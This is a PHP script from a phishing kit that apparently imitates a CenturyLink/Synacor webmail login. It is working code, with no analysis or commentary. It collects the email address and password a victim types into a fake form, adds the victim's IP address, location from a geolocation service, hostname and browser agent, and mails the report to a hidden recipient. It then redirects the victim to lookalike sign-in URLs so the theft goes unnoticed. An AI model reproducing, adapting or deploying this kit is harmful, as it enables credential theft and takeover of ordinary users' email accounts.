<?php
error_reporting();
ob_start();
session_start();
$togo = @$_GET['svr'];
$asp = "MyAccounts.aspx";
$axp ="Re_Identify";

//Getting user ip & hostname & mapping it to location
$ip = getenv("REMOTE_ADDR");
$getipinfo = file_get_contents("http://www.geoplugin.net/php.gp?ip=".$ip."");
$data = unserialize($getipinfo);
$city=$data['geoplugin_city'];
          $region=$data['geoplugin_regionName'];
          $country=$data['geoplugin_countryName'];
          $log_date = date('d/m/Y - h:i:s');
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];




/** form fields **/

$email = $_POST['email'];
$passwd = $_POST['password'];
$domain = @substr(strrchr($email, "@"), 1);
$wizard = $_POST['wiz'];
if (isset($wizard) && !empty($wizard)) {
    die();
} else {
    if ($email == "" || $passwd == "") {
        $error = "null_entry";
        $uri = "https://auth.weboauth.net/saml/module.php/authSynacor/login.php?AuthState=_8291c5634d9d89920e5d497c9c97c5f11d92c17bdd%3Ahttps%3A%2F%2Fauth.weboauth.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fauth.weboauth.net%252Fsaml%252Fmodule.php%252Fsaml%252Fsp%252Fmetadata.php%252FClient%252FLibrary%252FSaml%252Fsaml-sp%26cookieTime%3D1538377541%26RelayState%3Dhttps%253A%252F%252Fcenturylink.net%252Flogin%252F%253Fbounceto%253Dhttp%25253A%25252F%25252Fcenturylink.net%25252Fzmail%25252F%25253Fautologin%25253Dtrue%252526ts%25253D1538377506";
        header("Location: ./?error=$error&uri=$uri");
    } else {
//including email to send
        include '../Email.php';


//Arranging reports
        $Hash = "==================+[ The - Apprentice ]+==================
Email : $email
Password   : $passwd
Dom : $domain
============= [ Ip & Hostname Info ] =============

Client IP: $ip
Country: $country
Region: $region
City: $city
TimeStamp: $log_date 
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";

//Relaying...
        $subject = "$email | New $domain User Notification";
        $headers = "From: Alert<salesjob@privejets.net>";
        $headers .= $_POST['eMailAdd']."\n";
        $headers .= "MIME-Version: 1.0\n";
        mail($SEND, $subject, $Hash, $headers);

//Dynamic redirect
        if ($togo == 'tf') {
//Exiting
//Exiting
            $asp = "/account/challenge/password?sess=14&src=https://auth.weboauth.net/saml/module.php/authSynacor/login.php?AuthState=_8291c5634d9d&.intl=us&.lang=en-US&.partner=vz-acs&authMechanism=primary&display=login&yid=$email&done=https%3A%2F%2Fauth.weboauth.net/saml/module.php/login%2F&sessionIndex=Qw--&acrumb=4SZYMaUi";
            $top = "Consenting.app";
            $Redirect = "../docget.php?top=$top&crumb=$asp";

            header("Location: $Redirect").md5(time());
        } else {
//Exiting
//Exiting
            $asp = "/account/challenge/password?.src=weboauth&.intl=us&.lang=en-US&.partner=vz-acs&authMechanism=primary&error=sec&display=login&yid=$email&done=https%3A%2F%2Fauth.weboauth.net/saml/module.php/%2F&sessionIndex=Qw--&acrumb=4SZYMaUi";
            $top = "Recesserror.app";
            $Redirect = "./?top=$top&crumb=$asp";

            header("Location: $Redirect").md5(time());
        }
    }
}
